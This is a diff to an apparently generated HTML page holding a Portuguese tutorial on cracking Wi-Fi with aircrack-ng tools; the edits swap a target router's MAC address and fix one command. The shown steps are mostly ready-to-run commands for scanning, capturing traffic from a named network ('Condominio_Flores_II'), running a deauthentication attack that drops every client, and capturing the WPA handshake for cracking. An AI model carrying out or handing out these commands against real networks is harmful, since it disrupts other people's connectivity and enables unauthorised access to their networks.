@@ -2194,7 +2194,7 @@
 <div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airmon-ng
 </code></pre></div>
 <h2 id="com-a-ferramenta-airodump-ng-inicia-o-scan-de-todas-as-redes-proximas-aparecerao-diversas-redes">Com a ferramenta AIRODUMP-NG, inicia o scan de todas as redes próximas (aparecerão diversas redes):</h2>
-<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>start<span class="w"> </span>wlp0s20f3mon
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlp0s20f3mon
 </code></pre></div>
 <h2 id="encerra-o-scan-das-redes-apos-escolher-o-alvo">Encerra o scan das redes após escolher o alvo:</h2>
 <div class="highlight"><pre><span></span><code>ctrl+c
@@ -2207,13 +2207,13 @@
 <div class="highlight"><pre><span></span><code><span class="m">4</span>
 </code></pre></div>
 <h2 id="podemos-validar-apenas-a-rede-alvo-se-preferir">Podemos validar apenas a rede alvo, se preferir:</h2>
-<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlp0s20f3mon<span class="w"> </span>-d<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlp0s20f3mon<span class="w"> </span>-d<span class="w"> </span><span class="m">70</span>:4F:57:70:B6:5A
 </code></pre></div>
 <h2 id="posso-me-conectar-a-rede-wi-fi-alvo-se-for-um-laboratorio-usando-um-celular">Posso me conectar á rede wi-fi alvo, se for um laboratório, usando um celular.</h2>
 <h2 id="vai-constar-o-novo-cliente-com-dados-do-aparelho-definidos-em-station">Vai constar o novo cliente, com dados do aparelho, definidos em STATION.</h2>
 <p><code>TERMINAL 01</code> - VAMOS INICIAR A CAPTURA DOS PACOTES</p>
 <h2 id="subo-o-comando-de-captura-de-pacotes-da-rede-alvo-e-salvo-o-arquivo-de-captura">Subo o comando de captura de pacotes da rede alvo e salvo o arquivo de captura:</h2>
-<p><div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>-w<span class="w"> </span>capturados<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span>--bssid<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>wlp0s20f3mon
+<p><div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>-w<span class="w"> </span>capturados<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span>--bssid<span class="w"> </span><span class="m">70</span>:4F:57:70:B6:5A<span class="w"> </span>wlp0s20f3mon
 </code></pre></div>
 OU
 <div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>-w<span class="w"> </span>capturados<span class="w"> </span>--channel<span class="w"> </span><span class="m">2</span><span class="w"> </span>--essid<span class="w"> </span>Condominio_Flores_II<span class="w"> </span>wlp0s20f3mon
@@ -2221,13 +2221,13 @@ OU
 <p>Á partir daqui, eu aguardo algum dispositivo se conectar para realizar a captura do 4 Way Hand Shake.... OU</p>
 <p><code>TERMINAL 02</code> - VAMOS INICIAR O ATAQUE DE DESAUTENTICAÇÃO</p>
 <h2 id="inicia-o-ataque-ao-roteador-alvo-todos-os-clientes-caem-durante-o-ataque">Inicia o ataque ao roteador alvo (todos os clientes caem durante o ataque):</h2>
-<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">0</span><span class="w"> </span>-a<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>wlp0s20f3mon
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">0</span><span class="w"> </span>-a<span class="w"> </span><span class="m">70</span>:4F:57:70:B6:5A<span class="w"> </span>wlp0s20f3mon
 </code></pre></div>
 <p>Posso tbém, desautenticar apenas um dispositivo específico</p>
-<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">5</span><span class="w"> </span>-a<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>-c<span class="w"> </span><span class="m">28</span>:6C:07:6F:F9:53<span class="w"> </span>wlp0s20f3mon
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">5</span><span class="w"> </span>-a<span class="w"> </span><span class="m">70</span>:4F:57:70:B6:5A<span class="w"> </span>-c<span class="w"> </span><span class="m">28</span>:6C:07:6F:F9:53<span class="w"> </span>wlp0s20f3mon
 </code></pre></div>
 <h2 id="ao-tentar-re-conexao-os-clientes-entregam-o-handshake-de-4-vias-no-terminal-01">Ao tentar re-conexão, os clientes entregam o handshake de 4 vias no TERMINAL 01:</h2>
-<div class="highlight"><pre><span></span><code><span class="o">[</span>WPA<span class="w"> </span>handshake<span class="o">]</span>:<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E
+<div class="highlight"><pre><span></span><code><span class="o">[</span>WPA<span class="w"> </span>handshake<span class="o">]</span>:<span class="w"> </span><span class="m">70</span>:4F:57:70:B6:5A
 </code></pre></div>
 <h2 id="podemos-encerrar-a-captura-no-terminal-01">Podemos encerrar a captura no TERMINAL 01</h2>
 <div class="highlight"><pre><span></span><code>ctrl+c
